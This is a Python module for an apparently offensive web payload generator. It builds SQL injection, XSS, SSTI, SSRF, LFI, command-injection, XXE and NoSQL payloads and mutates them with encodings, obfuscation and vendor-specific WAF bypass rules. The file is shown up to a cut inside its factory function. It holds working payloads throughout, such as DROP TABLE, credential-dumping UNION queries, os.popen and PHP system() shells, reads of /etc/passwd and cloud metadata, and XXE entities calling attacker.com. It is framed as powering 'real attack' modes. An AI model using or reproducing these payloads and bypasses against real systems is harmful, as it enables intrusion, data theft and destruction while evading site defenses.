"""
Dynamic Payload Generation Engine.

Integrates all payload sources and mutation techniques to generate
thousands of unique payload combinations dynamically based on:
- Target tech stack
- Detected WAF
- Response patterns
- Successful mutations history

This is the core engine that powers real attack scenarios.
"""
from __future__ import annotations

import hashlib
import itertools
import logging
import random
import re
import sys
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Generator, Iterator, Optional

logger = logging.getLogger(__name__)

# Import PayloadLibrary from tools for extended payloads
try:
    # Add tools path
    tools_path = Path(__file__).parent.parent.parent / "tools"
    if tools_path.exists():
        sys.path.insert(0, str(tools_path))
    from payload_library import PayloadLibrary, PayloadCategory, EnhancedPayload
    HAS_PAYLOAD_LIBRARY = True
except ImportError:
    HAS_PAYLOAD_LIBRARY = False
    PayloadLibrary = None
    PayloadCategory = None


class PayloadMode(Enum):
    """Payload generation mode."""
    QUICK = auto()      # ~100 payloads - fast scan
    STANDARD = auto()   # ~1,000 payloads - balanced
    THOROUGH = auto()   # ~10,000 payloads - comprehensive
    AGGRESSIVE = auto() # All combinations - real attack


class MutationType(Enum):
    """Types of payload mutations."""
    ENCODING = auto()
    CASE_VARIATION = auto()
    OBFUSCATION = auto()
    CONCATENATION = auto()
    COMMENT_INJECTION = auto()
    NULL_BYTE = auto()
    UNICODE = auto()
    DOUBLE_ENCODING = auto()
    WHITESPACE = auto()
    PADDING = auto()


@dataclass
class PayloadContext:
    """Context for dynamic payload generation."""
    target_url: str = ""
    tech_stack: dict = field(default_factory=dict)
    waf_type: str = ""
    waf_confidence: float = 0.0
    successful_payloads: list[str] = field(default_factory=list)
    blocked_patterns: list[str] = field(default_factory=list)
    response_patterns: dict = field(default_factory=dict)
    mode: PayloadMode = PayloadMode.STANDARD


@dataclass
class GeneratedPayload:
    """A generated payload with metadata."""
    raw: str
    original: str
    mutations_applied: list[str]
    category: str
    confidence: float
    waf_bypass: bool = False
    encoding: str = "raw"
    hash: str = ""
    
    def __post_init__(self):
        if not self.hash:
            self.hash = hashlib.md5(self.raw.encode()).hexdigest()[:12]


class EncodingEngine:
    """Advanced encoding techniques for WAF bypass."""
    
    @staticmethod
    def url_encode(payload: str, safe: str = '') -> str:
        """Standard URL encoding."""
        return urllib.parse.quote(payload, safe=safe)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encoding for WAF bypass."""
        first = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(first, safe='')
    
    @staticmethod
    def triple_url_encode(payload: str) -> str:
        """Triple URL encoding for aggressive bypass."""
        return EncodingEngine.double_url_encode(
            urllib.parse.quote(payload, safe='')
        )
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode escape encoding."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def unicode_fullwidth(payload: str) -> str:
        """Fullwidth Unicode characters."""
        result = []
        for c in payload:
            if 'A' <= c <= 'Z':
                result.append(chr(ord(c) - ord('A') + 0xFF21))
            elif 'a' <= c <= 'z':
                result.append(chr(ord(c) - ord('a') + 0xFF41))
            elif '0' <= c <= '9':
                result.append(chr(ord(c) - ord('0') + 0xFF10))
            else:
                result.append(c)
        return ''.join(result)
    
    @staticmethod
    def html_entity_encode(payload: str, use_hex: bool = False) -> str:
        """HTML entity encoding."""
        if use_hex:
            return ''.join(f'&#x{ord(c):x};' for c in payload)
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def html_named_entities(payload: str) -> str:
        """Use named HTML entities where possible."""
        entities = {
            '<': '&lt;', '>': '&gt;', '&': '&amp;',
            '"': '&quot;', "'": '&#x27;', '/': '&#x2F;'
        }
        result = payload
        for char, entity in entities.items():
            result = result.replace(char, entity)
        return result
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encoding for SQL."""
        return '0x' + payload.encode().hex()
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encoding."""
        import base64
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def char_code_encode(payload: str) -> str:
        """JavaScript char code encoding."""
        codes = ','.join(str(ord(c)) for c in payload)
        return f'String.fromCharCode({codes})'
    
    @staticmethod
    def octal_encode(payload: str) -> str:
        """Octal encoding."""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
    
    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """Mix different encodings randomly."""
        result = []
        encodings = [
            lambda c: c,
            lambda c: urllib.parse.quote(c),
            lambda c: f'&#x{ord(c):x};',
            lambda c: f'\\u{ord(c):04x}',
        ]
        for c in payload:
            enc = random.choice(encodings)
            result.append(enc(c))
        return ''.join(result)
    
    @staticmethod
    def get_all_encodings(payload: str) -> dict[str, str]:
        """Get all encoding variants of a payload."""
        encodings = {
            'raw': payload,
            'url': EncodingEngine.url_encode(payload),
            'double_url': EncodingEngine.double_url_encode(payload),
            'triple_url': EncodingEngine.triple_url_encode(payload),
            'unicode': EncodingEngine.unicode_encode(payload),
            'unicode_fullwidth': EncodingEngine.unicode_fullwidth(payload),
            'html_decimal': EncodingEngine.html_entity_encode(payload, use_hex=False),
            'html_hex': EncodingEngine.html_entity_encode(payload, use_hex=True),
            'html_named': EncodingEngine.html_named_entities(payload),
            'hex': EncodingEngine.hex_encode(payload),
            'base64': EncodingEngine.base64_encode(payload),
            'char_code': EncodingEngine.char_code_encode(payload),
            'octal': EncodingEngine.octal_encode(payload),
            'mixed': EncodingEngine.mixed_encoding(payload),
        }
        return encodings


class ObfuscationEngine:
    """Advanced obfuscation techniques."""
    
    # SQL keyword alternatives
    SQL_ALTERNATIVES = {
        'SELECT': ['SELECT', 'SeLeCt', 'select', 'SELEC\x00T', '/*!SELECT*/', 'SEL/**/ECT'],
        'UNION': ['UNION', 'UnIoN', 'union', 'UNI/**/ON', '/*!UNION*/'],
        'FROM': ['FROM', 'FrOm', 'from', 'FR/**/OM'],
        'WHERE': ['WHERE', 'WhErE', 'where', 'WHE/**/RE'],
        'AND': ['AND', 'AnD', 'and', '&&', '%26%26'],
        'OR': ['OR', 'oR', 'or', '||', '%7c%7c'],
        'ORDER BY': ['ORDER BY', 'ORDER/**/BY', 'order by'],
        'GROUP BY': ['GROUP BY', 'GROUP/**/BY', 'group by'],
        'SLEEP': ['SLEEP', 'sleep', 'BENCHMARK', 'WAITFOR DELAY'],
        'CONCAT': ['CONCAT', 'concat', '||', '+'],
    }
    
    # XSS tag alternatives  
    XSS_TAGS = [
        'script', 'SCRIPT', 'ScRiPt', 'scr\x00ipt',
        'img', 'IMG', 'svg', 'SVG', 'body', 'BODY',
        'iframe', 'IFRAME', 'input', 'INPUT',
        'details', 'marquee', 'video', 'audio',
        'object', 'embed', 'form', 'button',
        'math', 'table', 'a', 'div', 'style',
    ]
    
    # Event handlers
    XSS_EVENTS = [
        'onerror', 'onload', 'onclick', 'onmouseover',
        'onfocus', 'onblur', 'onkeyup', 'onkeydown',
        'onmouseenter', 'onmouseleave', 'ondblclick',
        'oncontextmenu', 'onwheel', 'ondrag', 'ondrop',
        'onscroll', 'ontoggle', 'oninput', 'onchange',
        'onanimationend', 'ontransitionend', 'onpointerover',
    ]
    
    @staticmethod
    def case_variation(payload: str) -> list[str]:
        """Generate case variations."""
        variations = [
            payload,
            payload.upper(),
            payload.lower(),
            payload.capitalize(),
            payload.swapcase(),
        ]
        
        # Random case
        random_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        variations.append(random_case)
        
        # Alternating case
        alt_case = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        variations.append(alt_case)
        
        return list(set(variations))
    
    @staticmethod
    def comment_injection(payload: str) -> list[str]:
        """Inject comments to break pattern matching."""
        variations = [payload]
        
        # SQL-style comments
        variations.append(payload.replace(' ', '/**/'))
        variations.append(payload.replace(' ', '/*!*/'))
        variations.append(re.sub(r'(\w)(\w)', r'\1/**/\2', payload))
        
        # Inline comments
        for keyword in ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']:
            if keyword.lower() in payload.lower():
                variations.append(re.sub(
                    keyword, f'/*{keyword}*/{keyword}/*{keyword}*/',
                    payload, flags=re.IGNORECASE
                ))
        
        return list(set(variations))
    
    @staticmethod
    def whitespace_variation(payload: str) -> list[str]:
        """Generate whitespace variations."""
        variations = [payload]
        
        # Different whitespace chars
        whitespace_chars = [
            ' ', '\t', '\n', '\r', '\v', '\f',
            '%09', '%0a', '%0b', '%0c', '%0d', '%20',
            '%00', '+', '/**/',
        ]
        
        for ws in whitespace_chars:
            variations.append(payload.replace(' ', ws))
        
        # Multiple spaces
        variations.append(re.sub(r' +', '  ', payload))
        variations.append(re.sub(r' +', '   ', payload))
        
        # No spaces (concatenation)
        variations.append(payload.replace(' ', ''))
        
        return list(set(variations))
    
    @staticmethod
    def null_byte_injection(payload: str) -> list[str]:
        """Inject null bytes for filter bypass."""
        variations = [payload]
        
        null_variants = ['%00', '\x00', '\\x00', '\\0', '\0']
        
        for null in null_variants:
            variations.append(f'{payload}{null}')
            variations.append(f'{null}{payload}')
            # Insert in middle of keywords
            for keyword in ['script', 'select', 'union', 'alert']:
                if keyword in payload.lower():
                    mid = len(keyword) // 2
                    variations.append(re.sub(
                        keyword,
                        keyword[:mid] + null + keyword[mid:],
                        payload,
                        flags=re.IGNORECASE
                    ))
        
        return list(set(variations))
    
    @staticmethod
    def concatenation_bypass(payload: str) -> list[str]:
        """Break strings using concatenation."""
        variations = [payload]
        
        # SQL string concatenation
        if "'" in payload:
            variations.append(payload.replace("'", "'+'" if random.random() > 0.5 else "''"))
            variations.append(payload.replace("'", "' '"))
            variations.append(payload.replace("'", "'||'"))
        
        # JavaScript concatenation
        if '"' in payload:
            variations.append(payload.replace('"', '"+""+"'))
            variations.append(payload.replace('"', '"+"'))
        
        return list(set(variations))
    
    @staticmethod
    def sql_keyword_alternatives(payload: str) -> list[str]:
        """Replace SQL keywords with alternatives."""
        variations = [payload]
        
        for keyword, alts in ObfuscationEngine.SQL_ALTERNATIVES.items():
            if keyword.lower() in payload.lower():
                for alt in alts:
                    variations.append(re.sub(
                        keyword, alt, payload, flags=re.IGNORECASE
                    ))
        
        return list(set(variations))
    
    @staticmethod
    def generate_xss_variations(base_payload: str) -> list[str]:
        """Generate XSS payload variations."""
        variations = [base_payload]
        
        # Tag variations
        for tag in ObfuscationEngine.XSS_TAGS:
            variations.append(f'<{tag} onload=alert(1)>')
            variations.append(f'<{tag}/onload=alert(1)>')
            variations.append(f'<{tag}\tonload=alert(1)>')
            variations.append(f'<{tag}\nonload=alert(1)>')
        
        # Event handler variations
        for event in ObfuscationEngine.XSS_EVENTS:
            variations.append(f'<img src=x {event}=alert(1)>')
            variations.append(f'<svg {event}=alert(1)>')
            variations.append(f'<body {event}=alert(1)>')
        
        # Protocol variations
        protocols = [
            'javascript:', 'JaVaScRiPt:', 'java\tscript:',
            'java\nscript:', 'java\rscript:', '&#106;avascript:',
            'vbscript:', 'data:', 'data:text/html,',
        ]
        for proto in protocols:
            variations.append(f'<a href="{proto}alert(1)">')
            variations.append(f'<iframe src="{proto}alert(1)">')
        
        return list(set(variations))


class WAFBypassEngine:
    """WAF-specific bypass techniques."""
    
    # WAF-specific strategies
    WAF_STRATEGIES = {
        'cloudflare': {
            'encodings': ['unicode', 'unicode_fullwidth', 'mixed'],
            'techniques': ['whitespace_variation', 'null_byte_injection'],
            'special': [
                lambda p: p.replace("'", "\uFF07"),
                lambda p: p.replace('"', "\uFF02"),
                lambda p: p.replace('<', "\uFF1C"),
                lambda p: p.replace('>', "\uFF1E"),
            ]
        },
        'aws_waf': {
            'encodings': ['double_url', 'unicode', 'mixed'],
            'techniques': ['comment_injection', 'case_variation'],
            'special': [
                lambda p: p.replace('=', '\\u003D'),
                lambda p: p.replace('&', '\\u0026'),
            ]
        },
        'modsecurity': {
            'encodings': ['double_url', 'html_hex'],
            'techniques': ['comment_injection', 'sql_keyword_alternatives'],
            'special': [
                lambda p: re.sub(r'union', 'uni/**/on', p, flags=re.IGNORECASE),
                lambda p: re.sub(r'select', 'sel/**/ect', p, flags=re.IGNORECASE),
                lambda p: re.sub(r'script', 'scr/**/ipt', p, flags=re.IGNORECASE),
            ]
        },
        'imperva': {
            'encodings': ['triple_url', 'unicode'],
            'techniques': ['null_byte_injection', 'concatenation_bypass'],
            'special': [
                lambda p: p.replace(' ', '\x0b'),
                lambda p: p + '/*imperva*/',
            ]
        },
        'akamai': {
            'encodings': ['double_url', 'mixed'],
            'techniques': ['whitespace_variation'],
            'special': [
                lambda p: p.replace(' ', '%09'),
                lambda p: p.replace(' ', '%0b'),
                lambda p: p.replace(' ', '%0c'),
            ]
        },
        'f5_bigip': {
            'encodings': ['unicode', 'html_decimal'],
            'techniques': ['case_variation', 'comment_injection'],
            'special': []
        },
        'sucuri': {
            'encodings': ['double_url', 'triple_url'],
            'techniques': ['null_byte_injection'],
            'special': [
                lambda p: p.replace("'", "%bf%27"),  # GBK bypass
            ]
        },
        'wordfence': {
            'encodings': ['unicode', 'html_hex'],
            'techniques': ['case_variation', 'whitespace_variation'],
            'special': []
        },
        'generic': {
            'encodings': ['url', 'double_url', 'unicode', 'html_hex'],
            'techniques': ['case_variation', 'comment_injection', 'whitespace_variation'],
            'special': []
        }
    }
    
    @staticmethod
    def get_bypass_payloads(
        payload: str,
        waf_type: str = 'generic',
        max_variants: int = 50
    ) -> list[GeneratedPayload]:
        """Generate WAF bypass variants for a payload."""
        results = []
        waf_type = waf_type.lower().replace(' ', '_').replace('-', '_')
        
        # Get strategy for this WAF or fall back to generic
        strategy = WAFBypassEngine.WAF_STRATEGIES.get(
            waf_type, 
            WAFBypassEngine.WAF_STRATEGIES['generic']
        )
        
        # Apply encodings
        for enc_name in strategy['encodings']:
            try:
                enc_func = getattr(EncodingEngine, f'{enc_name}_encode', None)
                if enc_func:
                    encoded = enc_func(payload)
                elif enc_name == 'mixed':
                    encoded = EncodingEngine.mixed_encoding(payload)
                else:
                    encoded = EncodingEngine.get_all_encodings(payload).get(enc_name, payload)
                
                results.append(GeneratedPayload(
                    raw=encoded,
                    original=payload,
                    mutations_applied=[f'encoding:{enc_name}'],
                    category='waf_bypass',
                    confidence=0.7,
                    waf_bypass=True,
                    encoding=enc_name
                ))
            except Exception as e:
                logger.debug(f"Encoding {enc_name} failed: {e}")
        
        # Apply obfuscation techniques
        for technique in strategy['techniques']:
            try:
                tech_func = getattr(ObfuscationEngine, technique, None)
                if tech_func:
                    variants = tech_func(payload)
                    for variant in variants[:10]:  # Limit per technique
                        if variant != payload:
                            results.append(GeneratedPayload(
                                raw=variant,
                                original=payload,
                                mutations_applied=[f'technique:{technique}'],
                                category='waf_bypass',
                                confidence=0.6,
                                waf_bypass=True
                            ))
            except Exception as e:
                logger.debug(f"Technique {technique} failed: {e}")
        
        # Apply WAF-specific special bypasses
        for special_func in strategy.get('special', []):
            try:
                bypassed = special_func(payload)
                if bypassed != payload:
                    results.append(GeneratedPayload(
                        raw=bypassed,
                        original=payload,
                        mutations_applied=['special_bypass'],
                        category='waf_bypass',
                        confidence=0.8,
                        waf_bypass=True
                    ))
            except Exception as e:
                logger.debug(f"Special bypass failed: {e}")
        
        # Deduplicate and limit
        seen = set()
        unique = []
        for r in results:
            if r.raw not in seen:
                seen.add(r.raw)
                unique.append(r)
        
        return unique[:max_variants]


class DynamicPayloadEngine:
    """
    Main dynamic payload generation engine.
    
    Generates thousands of unique payload combinations by:
    1. Loading base payloads from all sources (including PayloadLibrary)
    2. Applying encoding variations
    3. Applying obfuscation techniques
    4. Applying WAF-specific bypasses
    5. Learning from responses
    6. Mutating successful payloads
    """
    
    # Category mapping from PayloadLibrary to internal types
    CATEGORY_MAP = {
        'SQL_INJECTION': 'sqli',
        'NOSQL_INJECTION': 'nosqli',
        'XSS': 'xss',
        'SSRF': 'ssrf',
        'SSTI': 'ssti',
        'XXE': 'xxe',
        'LFI': 'lfi',
        'RCE': 'rce',
        'JWT': 'jwt',
        'CRLF': 'crlf',
        'OPEN_REDIRECT': 'open_redirect',
        'LDAP_INJECTION': 'ldap',
        'XPATH_INJECTION': 'xpath',
        'GRAPHQL': 'graphql',
        'PROTOTYPE_POLLUTION': 'prototype_pollution',
        'CORS': 'cors',
        'CSRF': 'csrf',
        'CSS_INJECTION': 'css_injection',
        'CSV_INJECTION': 'csv_injection',
        'SSI': 'ssi',
        'LATEX_INJECTION': 'latex',
        'XSLT_INJECTION': 'xslt',
        'HTTP_PARAM_POLLUTION': 'hpp',
        'WEBSOCKET': 'websocket',
        'IDOR': 'idor',
    }
    
    # Base payloads for each attack type
    BASE_PAYLOADS = {
        'sqli': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1' AND '1'='1",
            "1 OR 1=1",
            "admin'--",
            "' OR ''='",
            "') OR ('1'='1",
            "' OR 'x'='x",
            "1' ORDER BY 1--",
            "1' UNION SELECT @@version--",
            "-1' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)#",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
            "' UNION ALL SELECT NULL,NULL,CONCAT(username,':',password) FROM users--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        ],
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert`1`>",
            "<svg/onload=alert(1)>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<math><mtext><mglyph><svg><mtext><textarea><path id=x></textarea><img src=1 onerror=alert(1)>",
        ],
        'ssti': [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{[].__class__.__base__.__subclasses__()}}",
            "${class.getResource('.').getPath()}",
            "#{7*7}",
            "*{7*7}",
            "@(7*7)",
            "{{constructor.constructor('return this')()}}",
        ],
        'ssrf': [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0.0.0.0",
            "http://0x7f000001",
            "http://2130706433",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stat",
            "gopher://127.0.0.1:6379/_",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.0.0.170/latest/meta-data/",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
        ],
        'lfi': [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "expect://id",
            "/etc/passwd%00",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "php://filter/read=string.rot13/resource=index.php",
        ],
        'rce': [
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "${IFS}id",
            ";${IFS}id",
            "a]||id||[",
            "';id;'",
            "\";id;\"",
            "a]||id||[a",
            "a]|id|[a",
            "\nid\n",
            "\r\nid\r\n",
        ],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd">',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        ],
        'nosqli': [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "sleep(5000)"}',
            "[$gt]=&password[$gt]=",
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            'true, $where: "1==1"',
            "'; return this.password; var dummy='",
            '{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}',
            '{"username": {"$in": ["admin", "administrator", "root"]}}',
        ],
    }
    
    def __init__(self, context: PayloadContext = None):
        """Initialize the dynamic payload engine."""
        self.context = context or PayloadContext()
        self.generated_count = 0
        self.cache: dict[str, list[GeneratedPayload]] = {}
        self._successful_mutations: list[tuple[str, str]] = []
        self._blocked_patterns: set[str] = set()
        self._extended_payloads: dict[str, list[str]] = {}
        
        # Load extended payloads from PayloadLibrary if available
        if HAS_PAYLOAD_LIBRARY:
            self._load_from_payload_library()
    
    def _load_from_payload_library(self):
        """Load extended payloads from tools/payload_library.py."""
        try:
            library = PayloadLibrary()
            
            # Map PayloadLibrary categories to internal types
            for cat in PayloadCategory:
                internal_type = self.CATEGORY_MAP.get(cat.name, cat.name.lower())
                payloads = library.get_by_category(cat)
                
                if payloads:
                    if internal_type not in self._extended_payloads:
                        self._extended_payloads[internal_type] = []
                    
                    for p in payloads:
                        self._extended_payloads[internal_type].append(p.raw)
            
            total = sum(len(v) for v in self._extended_payloads.values())
            logger.info(f"[PayloadLibrary] Loaded {total} extended payloads from {len(self._extended_payloads)} categories")
        except Exception as e:
            logger.warning(f"[PayloadLibrary] Failed to load: {e}")
    
    def get_extended_payloads(self, attack_type: str) -> list[str]:
        """Get extended payloads for an attack type."""
        return self._extended_payloads.get(attack_type.lower(), [])
    
    def set_context(self, **kwargs):
        """Update context dynamically."""
        for key, value in kwargs.items():
            if hasattr(self.context, key):
                setattr(self.context, key, value)
    
    def record_success(self, payload: str, mutation: str):
        """Record a successful payload/mutation for learning."""
        self._successful_mutations.append((payload, mutation))
    
    def record_blocked(self, pattern: str):
        """Record a blocked pattern to avoid."""
        self._blocked_patterns.add(pattern)
    
    def _get_mode_limits(self) -> dict:
        """Get limits based on current mode."""
        limits = {
            PayloadMode.QUICK: {
                'base_limit': 5,
                'encoding_limit': 3,
                'obfuscation_limit': 2,
                'waf_limit': 5,
                'total_limit': 100,
            },
            PayloadMode.STANDARD: {
                'base_limit': 10,
                'encoding_limit': 5,
                'obfuscation_limit': 3,
                'waf_limit': 15,
                'total_limit': 1000,
            },
            PayloadMode.THOROUGH: {
                'base_limit': 20,
                'encoding_limit': 10,
                'obfuscation_limit': 5,
                'waf_limit': 30,
                'total_limit': 10000,
            },
            PayloadMode.AGGRESSIVE: {
                'base_limit': 100,
                'encoding_limit': 14,  # All encodings
                'obfuscation_limit': 20,
                'waf_limit': 50,
                'total_limit': 100000,
            },
        }
        return limits[self.context.mode]
    
    def generate(
        self,
        attack_type: str,
        custom_payloads: list[str] = None
    ) -> Generator[GeneratedPayload, None, None]:
        """
        Generate payloads dynamically.
        
        Yields payloads one at a time for memory efficiency.
        
        Args:
            attack_type: Type of attack (sqli, xss, ssti, etc.)
            custom_payloads: Optional additional base payloads
        
        Yields:
            GeneratedPayload objects
        """
        limits = self._get_mode_limits()
        yielded = 0
        seen_hashes = set()
        
        # Get base payloads from internal BASE_PAYLOADS
        base_payloads = list(self.BASE_PAYLOADS.get(attack_type.lower(), []))
        
        # Add extended payloads from PayloadLibrary (if available)
        extended = self.get_extended_payloads(attack_type)
        if extended:
            # Add extended payloads that aren't duplicates
            existing_set = set(base_payloads)
            for p in extended:
                if p not in existing_set:
                    base_payloads.append(p)
                    existing_set.add(p)
        
        # Add custom payloads
        if custom_payloads:
            existing_set = set(base_payloads)
            for p in custom_payloads:
                if p not in existing_set:
                    base_payloads.append(p)
        
        # Limit base payloads based on mode
        base_payloads = base_payloads[:limits['base_limit']]
        
        for base in base_payloads:
            if yielded >= limits['total_limit']:
                break
            
            # Skip blocked patterns
            if any(blocked in base for blocked in self._blocked_patterns):
                continue
            
            # 1. Yield raw payload first
            raw_payload = GeneratedPayload(
                raw=base,
                original=base,
                mutations_applied=[],
                category=attack_type,
                confidence=1.0
            )
            if raw_payload.hash not in seen_hashes:
                seen_hashes.add(raw_payload.hash)
                yield raw_payload
                yielded += 1
            
            # 2. Generate encoding variations
            encodings = EncodingEngine.get_all_encodings(base)
            enc_count = 0
            for enc_name, encoded in encodings.items():
                if enc_count >= limits['encoding_limit']:
                    break
                if yielded >= limits['total_limit']:
                    break
                if encoded == base:
                    continue
                
                enc_payload = GeneratedPayload(
                    raw=encoded,
                    original=base,
                    mutations_applied=[f'encoding:{enc_name}'],
                    category=attack_type,
                    confidence=0.9,
                    encoding=enc_name
                )
                if enc_payload.hash not in seen_hashes:
                    seen_hashes.add(enc_payload.hash)
                    yield enc_payload
                    yielded += 1
                    enc_count += 1
            
            # 3. Generate obfuscation variations
            obfuscation_funcs = [
                ('case_variation', ObfuscationEngine.case_variation),
                ('comment_injection', ObfuscationEngine.comment_injection),
                ('whitespace_variation', ObfuscationEngine.whitespace_variation),
                ('null_byte_injection', ObfuscationEngine.null_byte_injection),
                ('concatenation_bypass', ObfuscationEngine.concatenation_bypass),
            ]
            
            if attack_type == 'sqli':
                obfuscation_funcs.append(
                    ('sql_alternatives', ObfuscationEngine.sql_keyword_alternatives)
                )
            
            obf_count = 0
            for obf_name, obf_func in obfuscation_funcs:
                if obf_count >= limits['obfuscation_limit']:
                    break
                
                try:
                    variants = obf_func(base)
                    for variant in variants[:5]:
                        if yielded >= limits['total_limit']:
                            break
                        if variant == base:
                            continue
                        
                        obf_payload = GeneratedPayload(
                            raw=variant,
                            original=base,
                            mutations_applied=[f'obfuscation:{obf_name}'],
                            category=attack_type,
                            confidence=0.8
                        )
                        if obf_payload.hash not in seen_hashes:
                            seen_hashes.add(obf_payload.hash)
                            yield obf_payload
                            yielded += 1
                            obf_count += 1
                except Exception:
                    pass
            
            # 4. Generate WAF bypass variations
            if self.context.waf_type:
                waf_payloads = WAFBypassEngine.get_bypass_payloads(
                    base,
                    self.context.waf_type,
                    max_variants=limits['waf_limit']
                )
                for waf_payload in waf_payloads:
                    if yielded >= limits['total_limit']:
                        break
                    waf_payload.category = attack_type
                    if waf_payload.hash not in seen_hashes:
                        seen_hashes.add(waf_payload.hash)
                        yield waf_payload
                        yielded += 1
            
            # 5. Generate combined mutations (encoding + obfuscation)
            if self.context.mode in [PayloadMode.THOROUGH, PayloadMode.AGGRESSIVE]:
                # Combine top obfuscations with top encodings
                for obf_name, obf_func in obfuscation_funcs[:3]:
                    try:
                        obf_variants = obf_func(base)[:3]
                        for obf_variant in obf_variants:
                            for enc_name, enc_func in [
                                ('url', EncodingEngine.url_encode),
                                ('double_url', EncodingEngine.double_url_encode),
                                ('unicode', EncodingEngine.unicode_encode),
                            ]:
                                if yielded >= limits['total_limit']:
                                    break
                                
                                try:
                                    combined = enc_func(obf_variant)
                                    combined_payload = GeneratedPayload(
                                        raw=combined,
                                        original=base,
                                        mutations_applied=[
                                            f'obfuscation:{obf_name}',
                                            f'encoding:{enc_name}'
                                        ],
                                        category=attack_type,
                                        confidence=0.7,
                                        encoding=enc_name
                                    )
                                    if combined_payload.hash not in seen_hashes:
                                        seen_hashes.add(combined_payload.hash)
                                        yield combined_payload
                                        yielded += 1
                                except Exception:
                                    pass
                    except Exception:
                        pass
        
        # 6. Generate mutations from successful payloads
        for successful, mutation_type in self._successful_mutations[-10:]:
            if yielded >= limits['total_limit']:
                break
            
            # Apply additional mutations to successful payloads
            try:
                if mutation_type.startswith('encoding:'):
                    # Try different encodings
                    for enc in ['double_url', 'unicode', 'mixed']:
                        encoded = EncodingEngine.get_all_encodings(successful).get(enc, successful)
                        if encoded != successful:
                            mutation_payload = GeneratedPayload(
                                raw=encoded,
                                original=successful,
                                mutations_applied=[f'learned:{mutation_type}', f'encoding:{enc}'],
                                category=attack_type,
                                confidence=0.85
                            )
                            if mutation_payload.hash not in seen_hashes:
                                seen_hashes.add(mutation_payload.hash)
                                yield mutation_payload
                                yielded += 1
            except Exception:
                pass
        
        self.generated_count = yielded
        logger.info(f"Generated {yielded} payloads for {attack_type}")
    
    def generate_all(self, attack_type: str) -> list[GeneratedPayload]:
        """Generate all payloads and return as list."""
        return list(self.generate(attack_type))
    
    def get_stats(self) -> dict:
        """Get generation statistics."""
        return {
            'total_generated': self.generated_count,
            'successful_mutations': len(self._successful_mutations),
            'blocked_patterns': len(self._blocked_patterns),
            'mode': self.context.mode.name,
            'waf_type': self.context.waf_type or 'none',
        }


def create_engine(
    mode: str = 'standard',
    waf_type: str = '',
    tech_stack: dict = None
) -> DynamicPayloadEngine:
    """
    Factory function to create a configured payload engine.
    
    Args:
        mode: 'quick', 'standard', 'thorough', or 'aggressive'
        waf_type: Detected WAF type
        tech_stack: Detected technology stack
    
    Returns:
        Configured DynamicPayloadEngine
    """
    mode_map = {
